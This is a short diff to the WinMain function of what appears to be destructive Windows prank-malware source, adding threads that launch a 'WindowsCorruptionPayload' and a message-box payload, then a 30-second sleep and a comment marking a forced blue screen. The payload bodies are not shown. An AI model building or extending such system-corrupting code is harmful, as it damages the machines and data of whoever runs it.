@@ -18,5 +18,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszArgum
 	ExecutePayload(Payload7, PAYLOAD_TIME);
 	ExecutePayload(Payload8, PAYLOAD_TIME);
 	ExecutePayload(Payload9, PAYLOAD_TIME);
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
+	Sleep(30000);
+	//bsod here.
 	return 0;
 }
